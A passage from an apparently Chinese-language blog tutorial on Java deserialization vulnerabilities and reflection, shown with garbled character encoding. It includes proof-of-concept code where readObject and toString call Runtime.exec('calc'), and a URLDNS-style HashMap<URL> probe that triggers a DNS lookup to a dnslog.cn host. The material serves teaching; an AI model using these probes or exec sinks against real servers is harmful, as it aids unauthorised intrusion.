class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//è°ƒç”¨ unserialize(&quot;ser.bin&quot;)ï¼Œä» ser.bin æ–‡ä»¶é‡Œååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ªå¯¹è±¡ï¼Œå¼ºåˆ¶è½¬æ¢ä¸º Person ç±»å‹</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><font style="color:#080808;background-color:#ffffff;">Serialization åˆ›å»º Person å¯¹è±¡å¹¶å°†å…¶åºåˆ—åŒ–ä¿å­˜åˆ°æ–‡ä»¶ ser.bin</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png" srcset="/img/loading.gif" lazyload></p>
<p>ç”Ÿæˆçš„ <font style="color:#080808;background-color:#ffffff;"> ser.bin </font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png" srcset="/img/loading.gif" lazyload></p>
<p><font style="color:#080808;background-color:#ffffff;">Unserialize  ä» ser.bin æ–‡ä»¶é‡Œæ¢å¤ï¼ˆååºåˆ—åŒ–ï¼‰ä¸€ä¸ªå¯¹è±¡  </font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>æ€»çš„æ¥è¯´ï¼š</strong></p>
<p> åœ¨ <code>serialize</code> æ–¹æ³•ä¸­ï¼Œå…ˆé€šè¿‡è¾“å‡ºæµå¯¹è±¡ <code>new FileOutputStream(&quot;ser.bin&quot;)</code>ã€ç­‰ä»·äº <code>Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))</code>ã€‘åˆ›å»ºæ–‡ä»¶è¾“å‡ºé€šé“ï¼Œç„¶åå°†è¾“å‡ºæµåŒ…è£…æˆ <code>ObjectOutputStream</code>ï¼Œå†è°ƒç”¨ <code>writeObject</code> æ–¹æ³•å°†å¯¹è±¡åºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶ã€‚</p>
<p> åœ¨ <code>unserialize</code> æ–¹æ³•ä¸­ï¼Œå…ˆé€šè¿‡è¾“å…¥æµå¯¹è±¡ <code>new FileInputStream(&quot;ser.bin&quot;)</code>ã€ç­‰ä»·äº <code>Files.newInputStream(Paths.get(&quot;ser.bin&quot;))</code>ã€‘åˆ›å»ºæ–‡ä»¶è¾“å…¥é€šé“ï¼Œç„¶åå°†è¾“å…¥æµåŒ…è£…æˆ <code>ObjectInputStream</code>ï¼Œå†è°ƒç”¨ <code>readObject</code> æ–¹æ³•å°†æ–‡ä»¶ä¸­çš„äºŒè¿›åˆ¶æ•°æ®è¯»å–å‡ºæ¥å¹¶ååºåˆ—åŒ–æˆå¯¹è±¡ã€‚  </p>
<h2 id="1-5-ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ"><a href="#1-5-ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ" class="headerlink" title="1.5 ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ"></a>1.5 ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ</h2><p>åªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¼ é€’ç±»çš„readObjectä¸­ä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œç»™äºˆæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›ã€‚</p>
<ol>
<li><font style="color:rgb(51, 51, 51);">å…¥å£ç±»çš„</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);&quot;&gt;readObject&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</font></li>
<li><font style="color:rgb(51, 51, 51);">å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject æ—¶è°ƒç”¨</font></li>
<li><font style="color:rgb(51, 51, 51);">å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject æ—¶è°ƒç”¨</font></li>
<li><font style="color:rgb(51, 51, 51);">æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ</font></li>
</ol>
<h3 id="1-5-1-å…¥å£ç±»çš„-readObject-ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•"><a href="#1-5-1-å…¥å£ç±»çš„-readObject-ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•" class="headerlink" title="1.5.1 å…¥å£ç±»çš„ readObject ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•"></a>1.5.1 å…¥å£ç±»çš„ <code>readObject</code> ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</h3><p>Person ç±»ä¸­å†™å…¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">//è°ƒç”¨é»˜è®¤çš„ååºåˆ—åŒ–è¿‡ç¨‹</span><br>    ois.defaultReadObject();<br>    <span class="hljs-comment">//æ‰§è¡Œäº†ä¸€ä¸ªç³»ç»Ÿå‘½ä»¤</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p> ååºåˆ—åŒ–æ—¶ JVM ä¼šå…ˆè°ƒç”¨ Person ç±»ä¸­è‡ªå®šä¹‰çš„ <code>readObject</code> æ–¹æ³•ï¼Œè€Œå…¶ä¸­åŠ å…¥äº†å‘½ä»¤æ‰§è¡Œé€»è¾‘ï¼Œå› æ­¤å¯¹è±¡æ¢å¤è¿‡ç¨‹ä¸­å°±è§¦å‘äº†è®¡ç®—å™¨çš„è¿è¡Œã€‚  </p>
<p>ä¾æ¬¡æ‰§è¡Œåºåˆ—åŒ–ã€ååºåˆ—åŒ–ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="1-5-2-å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject-æ—¶è°ƒç”¨"><a href="#1-5-2-å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject-æ—¶è°ƒç”¨" class="headerlink" title="1.5.2 å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject æ—¶è°ƒç”¨"></a>1.5.2 å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject æ—¶è°ƒç”¨</h3><p>ä¸ºä»€ä¹ˆHashMapè¦è‡ªå·±å®ç°writeObjectå’ŒreadObjectæ–¹æ³•ï¼Ÿ</p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test01</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL, Integer&gt; hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://w9ge5j.dnslog.cn&quot;</span>);<br>        hash.put(u, <span class="hljs-number">1</span>);<br><br>        serializableTest(hash);<br>        unserializableTest(<span class="hljs-string">&quot;dns.txt&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;dns.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializableTest</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png" srcset="/img/loading.gif" lazyload></p>
<p><code>URL</code> ç±»åœ¨ JDK é‡Œæ˜¯è‡ªå¸¦çš„ç±»ï¼Œå®ƒçš„ <code>hashCode()</code> æ–¹æ³•é‡Œä¼šè§¦å‘ DNS è§£æ  </p>
<p> å…¥å£å‚æ•°é‡ŒåŒ…å«äº†å¯æ§çš„ç±»ï¼ˆ<code>URL</code>ï¼‰ï¼Œè€Œè¯¥ç±»åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨å±é™©æ–¹æ³•ï¼ˆ<code>hashCode()</code> è§¦å‘ DNS è§£æï¼‰ï¼Œé‚£ä¹ˆåœ¨ <code>readObject()</code> ååºåˆ—åŒ–æ—¶å°±ä¼šæ‰§è¡Œè¿™äº›å±é™©é€»è¾‘ï¼Œé€ æˆå®‰å…¨é£é™©ã€‚  </p>
<h4 id="HashMap-æ‰¾å…¥å£ç±»åˆ†æï¼š"><a href="#HashMap-æ‰¾å…¥å£ç±»åˆ†æï¼š" class="headerlink" title="HashMap æ‰¾å…¥å£ç±»åˆ†æï¼š"></a>HashMap æ‰¾å…¥å£ç±»åˆ†æï¼š</h4><p>æœ¬ä¾‹ä¸­çš„ä»£ç åˆ©ç”¨äº† <font style="color:#080808;background-color:#ffffff;">HashMap&lt;URL, Integer&gt;</font>ï¼Œé‚£ä¹ˆçœ‹çœ‹ä¸ºä»€ä¹ˆå®ƒä¼šé€ æˆæ¼æ´</p>
<p>è·Ÿè¿› HashMap ï¼Œæ­¤å¤„ç»§æ‰¿äº† <font style="color:#080808;background-color:#ffffff;">Serializable</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰¾åˆ°é‡å†™çš„ readObject</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752120.png" srcset="/img/loading.gif" lazyload></p>
<p>è·Ÿè¿› hash</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png" srcset="/img/loading.gif" lazyload></p>
<p>è·Ÿè¿› hashCode,<font style="color:rgb(80, 80, 92);">hashCode ä½ç½®å¤„äº Object ç±»å½“ä¸­</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™æ ·ï¼ŒHashMap å®Œç¾æ»¡è¶³äº†å¯åºåˆ—åŒ–ã€é‡å†™ readObjectã€æ¥æ”¶ä»»æ„å¯¹è±¡ä½œä¸ºå‚æ•°ã€JDK è‡ªå¸¦çš„å…¥å£ç±»æ¡ä»¶ã€‚</p>
<h3 id="1-5-3-å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject-æ—¶è°ƒç”¨"><a href="#1-5-3-å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject-æ—¶è°ƒç”¨" class="headerlink" title="1.5.3 å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject æ—¶è°ƒç”¨"></a><font style="color:rgb(51, 51, 51);">1.5.3 å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject æ—¶è°ƒç”¨</font></h3><h3 id="1-5-4-æ„é€ å‡½æ•°-é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ"><a href="#1-5-4-æ„é€ å‡½æ•°-é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ" class="headerlink" title="1.5.4 æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ"></a><font style="color:rgb(51, 51, 51);">1.5.4 æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    	 <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>&#125;  <br><br><span class="hljs-comment">//å¯¹objå¯¹è±¡è¿›è¡Œè¾“å‡º é»˜è®¤è°ƒç”¨åŸå§‹å¯¹è±¡çš„toString æ–¹æ³•</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure>

<p> åœ¨ <code>toString()</code> ä¸­å†™å…¥å±é™©é€»è¾‘ï¼Œé‚£ä¹ˆåªè¦å¯¹è±¡åœ¨æ‰“å°æ—¶è¢«éšå¼è°ƒç”¨ï¼Œå°±ä¼šè‡ªåŠ¨æ‰§è¡Œæ¶æ„ä»£ç   </p>
<h2 id="1-6-æ‰¾æ¼æ´çš„ä¸‰ä¸ªæ¡ä»¶"><a href="#1-6-æ‰¾æ¼æ´çš„ä¸‰ä¸ªæ¡ä»¶" class="headerlink" title="1.6 æ‰¾æ¼æ´çš„ä¸‰ä¸ªæ¡ä»¶"></a>1.6 æ‰¾æ¼æ´çš„ä¸‰ä¸ªæ¡ä»¶</h2><p>é¦–å…ˆä¸€ä¸ªå‰æï¼š<strong><font style="color:rgb(80, 80, 92);">ç»§æ‰¿äº† </font></strong><font style="color:#080808;background-color:#ffffff;">Serializable</font><font style="color:rgb(80, 80, 92);">ï¼Œä½¿å¯¹è±¡å¯åºåˆ—åŒ–</font></p>
<ul>
<li>å…¥å£ç±» source	<ul>
<li>å¯åºåˆ—åŒ–</li>
<li>é‡å†™ readObject è°ƒç”¨å¸¸è§å‡½æ•°</li>
<li>æ¥æ”¶ä»»æ„å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå‚æ•°ç±»å‹å®½æ³›</li>
<li>æœ€å JDK è‡ªå¸¦</li>
</ul>
</li>
<li>è°ƒç”¨é“¾ gadget chain</li>
<li>æ‰§è¡Œç±» sink <ul>
<li><font style="color:rgb(80, 80, 92);">RCE SSRF å†™æ–‡ä»¶ç­‰ç­‰</font></li>
</ul>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="2ã€Java-åå°„-URLDNS-é“¾"><a href="#2ã€Java-åå°„-URLDNS-é“¾" class="headerlink" title="2ã€Java åå°„+URLDNS é“¾"></a><font style="color:rgb(76, 76, 87);">2ã€Java åå°„+URLDNS é“¾</font></h1><h2 id="2-1-Java-åå°„ç†è§£"><a href="#2-1-Java-åå°„ç†è§£" class="headerlink" title="2.1 Java åå°„ç†è§£"></a>2.1 Java åå°„ç†è§£</h2><blockquote>
<p><font style="color:rgb(37, 41, 51);">è°ˆè°ˆJavaåå°„ï¼šä»å…¥é—¨åˆ°å®è·µï¼Œå†åˆ°åŸç†</font></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p>
</blockquote>
<p>åå°„çš„ä½œç”¨ï¼šè®© Java å…·æœ‰åŠ¨æ€æ€§</p>
<h3 id="2-1-1-é™æ€è¯­è¨€-VS-åŠ¨æ€è¯­è¨€"><a href="#2-1-1-é™æ€è¯­è¨€-VS-åŠ¨æ€è¯­è¨€" class="headerlink" title="2.1.1 é™æ€è¯­è¨€ VS åŠ¨æ€è¯­è¨€"></a>2.1.1 é™æ€è¯­è¨€ VS åŠ¨æ€è¯­è¨€</h3><p>Java æœ¬èº«ä½¿ä¸€ç§é™æ€è¯­è¨€ï¼Œç¼–è¯‘æ—¶å°±å†³å®šäº†ç±»å‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç¼–è¯‘å™¨è®¤ä¸º student çš„ç±»å‹æ˜¯ Studentï¼Œ</span><br><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure>

<p>è€ŒåŠ¨æ€è¯­è¨€ï¼Œæ¯”å¦‚PHPï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;hello&quot;</span>;  <span class="hljs-comment">// æ­¤æ—¶ $var æ˜¯å­—ç¬¦ä¸²</span><br><span class="hljs-variable">$var</span> = <span class="hljs-number">123</span>;      <span class="hljs-comment">// è¿è¡Œæ—¶å†èµ‹å€¼ï¼Œç°åœ¨ $var å°±æ˜¯æ•´æ•°</span><br></code></pre></td></tr></table></figure>

<p>å†æ¬¡å¯¹æ¯”ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753866.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="2-1-2-æ­£å°„ä¸åå°„"><a href="#2-1-2-æ­£å°„ä¸åå°„" class="headerlink" title="2.1.2 æ­£å°„ä¸åå°„"></a><font style="color:rgb(76, 76, 87);">2.1.2 æ­£å°„ä¸åå°„</font></h3><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/index.html">å®˜æ–¹å¯¹åå°„çš„è§£é‡Š</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>åå°„æœºåˆ¶</strong>ä½¿Javaä»£ç èƒ½å¤Ÿæ¢æŸ¥å·²åŠ è½½ç±»çš„å­—æ®µã€æ–¹æ³•åŠæ„é€ å‡½æ•°ä¿¡æ¯ï¼Œå¹¶åœ¨å®‰å…¨é™åˆ¶èŒƒå›´å†…ï¼Œé€šè¿‡åå°„å­—æ®µã€æ–¹æ³•å’Œæ„é€ å‡½æ•°å¯¹è¿™äº›åº•å±‚å¯¹åº”å…ƒç´ è¿›è¡Œæ“ä½œã€‚è¯¥ API æ—¢æ”¯æŒéœ€è¦è®¿é—®ç›®æ ‡å¯¹è±¡å…¬å…±æˆå‘˜ï¼ˆåŸºäºå…¶è¿è¡Œæ—¶ç±»ï¼‰çš„åº”ç”¨ç¨‹åºï¼Œä¹Ÿæ”¯æŒè®¿é—®ç»™å®šç±»å£°æ˜æˆå‘˜çš„åœºæ™¯ï¼ŒåŒæ—¶å…è®¸ç¨‹åºæŠ‘åˆ¶é»˜è®¤çš„åå°„è®¿é—®æ§åˆ¶ã€‚</p>
<p><strong>æ­£å°„ï¼ˆç›´æ¥è°ƒç”¨ï¼‰ï¼šåœ¨æœªè¿è¡Œæ—¶ï¼ˆç¼–è¯‘æ—¶ï¼‰å·²ç»çŸ¥é“äº†è¦è¿è¡Œçš„ç±»</strong> <strong>Student</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753359.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>åå°„ï¼šåœ¨è¿è¡Œçš„æ—¶å€™ forName ä» className&#x3D;â€com.demo02.Studentâ€ åŠ è½½ Student ç±»ï¼Œå†å»è°ƒç”¨æ–¹æ³•</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="2-1-3-Class-å¯¹è±¡ç†è§£"><a href="#2-1-3-Class-å¯¹è±¡ç†è§£" class="headerlink" title="2.1.3 Class å¯¹è±¡ç†è§£"></a>2.1.3 Class å¯¹è±¡ç†è§£</h3><p><font style="color:rgb(37, 41, 51);"> å…ˆç†è§£ ï¼š</font><strong><font style="color:rgb(37, 41, 51);">RTTIï¼ˆRun-Time Type Identificationï¼‰è¿è¡Œæ—¶ç±»å‹è¯†åˆ«</font></strong></p>
<p>Java åœ¨è¿è¡Œæ—¶è¯†åˆ«å¯¹è±¡å’Œç±»çš„ä¿¡æ¯ä¸»è¦ä»¥ä¿©ç§æ–¹å¼ï¼šä¸€ç§æ˜¯ RTTI ï¼Œå®ƒå‡å®šæˆ‘ä»¬åœ¨ç¼–è¯‘æœŸå·²çŸ¥é“äº†æ‰€æœ‰ç±»å‹ï¼›å¦ä¸€ç§æ˜¯ åå°„ï¼Œåœ¨è¿è¡Œæ—¶å‘ç°å’Œä½¿ç”¨ç±»çš„ä¿¡æ¯ã€‚</p>
<p><strong><font style="color:rgb(37, 41, 51);">æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªClasså¯¹è±¡</font></strong><font style="color:rgb(37, 41, 51);">ï¼Œæ¯å½“ç¼–è¯‘ä¸€ä¸ªæ–°ç±»å°±äº§ç”Ÿä¸€ä¸ªClasså¯¹è±¡ï¼ˆæ›´æ°å½“åœ°è¯´ï¼Œæ˜¯è¢«ä¿å­˜åœ¨ä¸€ä¸ªåŒåçš„.classæ–‡ä»¶ä¸­ï¼‰ã€‚</font></p>
<p><font style="color:rgb(37, 41, 51);">æ¯”å¦‚åˆ›å»ºä¸€ä¸ªStudentç±»ï¼Œé‚£ä¹ˆï¼ŒJVMå°±ä¼šåˆ›å»ºä¸€ä¸ªStudentå¯¹åº”Classç±»çš„Classå¯¹è±¡ï¼Œè¯¥Classå¯¹è±¡ä¿å­˜äº†Studentç±»ç›¸å…³çš„ç±»å‹ä¿¡æ¯ã€‚</font></p>
<p><strong><font style="color:rgb(37, 41, 51);">Classç±»çš„å¯¹è±¡ä½œç”¨</font></strong><font style="color:rgb(37, 41, 51);">æ˜¯è¿è¡Œæ—¶æä¾›æˆ–è·å¾—æŸä¸ªå¯¹è±¡çš„ç±»å‹ä¿¡æ¯</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp" srcset="/img/loading.gif" lazyload></p>
<h2 id="2-2-åå°„ä½¿ç”¨"><a href="#2-2-åå°„ä½¿ç”¨" class="headerlink" title="2.2 åå°„ä½¿ç”¨"></a>2.2 åå°„ä½¿ç”¨</h2><h3 id="2-2-1-åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•"><a href="#2-2-1-åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•" class="headerlink" title="2.2.1 åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•"></a>2.2.1 åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•</h3><ul>
<li>è·å–ç±»çš„æ–¹æ³•ï¼šforName</li>
<li>å®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼šnewInstance</li>
<li>è·å–å‡½æ•°çš„æ–¹æ³•ï¼šgetMethod</li>
<li>æ‰§è¡Œå‡½æ•°çš„æ–¹æ³•ï¼šinvoke</li>
</ul>
<h3 id="2-2-2-è·å–-Class-ç±»å¯¹è±¡"><a href="#2-2-2-è·å–-Class-ç±»å¯¹è±¡" class="headerlink" title="2.2.2 è·å– Class ç±»å¯¹è±¡"></a>2.2.2 è·å– Class ç±»å¯¹è±¡</h3><ul>
<li>å·²çŸ¥<strong>å…·ä½“çš„ç±»</strong>ï¼Œé€šè¿‡ç±»çš„ <strong>class</strong> å±æ€§è·å–ï¼Œ</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Person.class;<br></code></pre></td></tr></table></figure>

<ul>
<li>å·²çŸ¥æŸä¸ª<strong>ç±»çš„å®ä¾‹</strong>ï¼Œè°ƒç”¨è¯¥å®ä¾‹çš„ **getClass() **æ–¹æ³•è·å– Class å¯¹è±¡</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br></code></pre></td></tr></table></figure>

<ul>
